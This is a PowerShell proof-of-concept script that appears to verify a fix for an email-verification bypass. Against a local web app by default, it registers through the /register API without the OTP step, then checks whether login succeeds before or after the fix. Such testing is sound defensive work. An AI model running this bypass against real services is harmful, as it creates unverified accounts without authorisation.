$Base  = if ($env:BASE)  { $env:BASE }  else { "http://localhost:5002" }
$Email = if ($env:EMAIL) { $env:EMAIL } else { "attackerafterfix@example.com" }
$Name  = "Demo Account"
$Pass  = "secret123"

function Section($t) { Write-Host "`n== $t ==" -ForegroundColor Cyan }

$regBody   = @{ name = $Name; temail = $Email; password = $Pass } | ConvertTo-Json -Depth 5 -Compress
$loginBody = @{ temail = $Email; password = $Pass }               | ConvertTo-Json -Depth 5 -Compress

Section "STEP 1: Register directly via the API (skips the UI's OTP step)"
Write-Host "email: $Email"
try {
  $reg = Invoke-RestMethod -Uri "$Base/register" -Method Post -ContentType 'application/json' -Body $regBody
  $reg | ConvertTo-Json
  if ($reg.token) { Write-Host "[!] register returned a TOKEN -> bypass works (BEFORE fix)." -ForegroundColor Red }
} catch {
  Write-Host "register failed: $($_.Exception.Message)"
  if ($_.ErrorDetails.Message) { $_.ErrorDetails.Message }
}

Section "STEP 2: Try to log in immediately (no email verification done)"
try {
  $login = Invoke-RestMethod -Uri "$Base/login" -Method Post -ContentType 'application/json' -Body $loginBody
  Write-Host "[HTTP 200] login succeeded (BEFORE fix - bypass works):" -ForegroundColor Yellow
  $login | ConvertTo-Json
} catch {
  $code = $_.Exception.Response.StatusCode.value__
  Write-Host "[HTTP $code] login blocked (AFTER fix):" -ForegroundColor Green
  if ($_.ErrorDetails.Message) { $_.ErrorDetails.Message }
}

